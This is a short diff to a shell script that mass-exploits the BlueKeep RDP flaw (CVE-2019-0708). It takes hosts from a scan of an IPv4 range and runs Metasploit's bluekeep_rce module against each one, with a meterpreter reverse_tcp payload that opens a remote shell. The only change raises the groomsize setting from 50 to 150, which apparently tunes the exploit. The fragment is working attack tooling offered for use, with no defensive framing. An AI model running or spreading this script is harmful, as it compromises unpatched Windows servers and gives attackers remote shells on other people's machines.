@@ -26,4 +26,4 @@ echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
 sleep 1m;
 grep appid rdp.lst >rdp.vuln;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.vuln`; do msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 4445; set rhost $i; set groomsize 50; set target 1; exploit;" ; done
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.vuln`; do msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 4445; set rhost $i; set groomsize 150; set target 1; exploit;" ; done
